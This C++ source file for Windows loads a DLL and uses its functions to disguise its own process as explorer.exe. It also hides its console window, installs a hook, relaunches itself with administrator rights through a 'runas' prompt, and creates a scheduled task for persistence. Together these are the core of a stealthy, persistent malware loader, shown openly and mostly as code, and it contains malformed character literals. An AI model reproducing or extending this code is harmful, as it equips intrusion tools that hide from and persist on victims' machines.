
//#define ZEXPORT WINAPI

#include <stdio.h>
//#include"11/include/unzip.h"
//#include <zlib.h>

#include <windows.h>
#include <tchar.h>


//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )// 设置入口地址
typedef  void(*PADD)(  LPCTSTR);
using isadmin = bool(*)();
using m_wCreateTask = int(*)(LPCWSTR);
using m_DisguiseProcess = bool(*)(DWORD,  wchar_t* , wchar_t* );
HMODULE hDLL;

// 以管理员运行
VOID ManagerRun(LPCWSTR exe, LPCWSTR param, INT nShow = SW_SHOW)
{ //注意：会跳出提示。
	SHELLEXECUTEINFO ShExecInfo;
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = L"runas";
	ShExecInfo.lpFile = exe;
	ShExecInfo.lpParameters = param;
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = nShow;
	ShExecInfo.hInstApp = NULL;
	BOOL ret = ShellExecuteEx(&ShExecInfo);
	//等不及了，不等了。
	CloseHandle(ShExecInfo.hProcess);
	return;
}

int main(int argc, char* argv[]) {
	
	hDLL = LoadLibrary(L"Project2.dll");
	if (hDLL == NULL) return 0;

	isadmin IsRunAsAdministrator = (isadmin)GetProcAddress(hDLL, "IsRunAsAdministrator");  // 是否是管理员运行
	m_wCreateTask wCreateTask = (m_wCreateTask)GetProcAddress(hDLL, "wCreateTask");  // 创建计划任务
	PADD installhook = (PADD)GetProcAddress(hDLL, "installhook");  // 获取函数
	m_DisguiseProcess DisguiseProcess = (m_DisguiseProcess)GetProcAddress(hDLL, "DisguiseProcess");
	WCHAR exefullpath[256];
	memset(exefullpath, 0, sizeof(exefullpath));
	MultiByteToWideChar(CP_ACP, 0, argv[0], strlen(argv[0]) + 1, exefullpath,
		sizeof(exefullpath) / sizeof(exefullpath[0]));
	// C:\Windows\explorer.exe
	wchar_t diskName[18] = { L'e', L'x ',L'p', L'l',L'o', L'r ',L'e', L'r ',L'.', L'e ',L'x', L'e ' };
	wchar_t aa[] = L"C:\\Windows\\explorer.exe";
	wchar_t bb[] = L"explorer.exe";

	// 进程伪装
	DisguiseProcess(GetCurrentProcessId(), aa,bb );
	
	if (!IsRunAsAdministrator()) //
	{
		
		ShowWindow(GetConsoleWindow(), SW_HIDE);
		installhook(exefullpath);
		ManagerRun(exefullpath, L"2");
		return 1;
	}
	else  //再次运行,即上面那个ManagerRun
	{
		/*你的程序主代码在此*/ // 这里就是有管理员权限的
		wCreateTask(exefullpath);
		installhook(exefullpath);

	}

	return 0;
}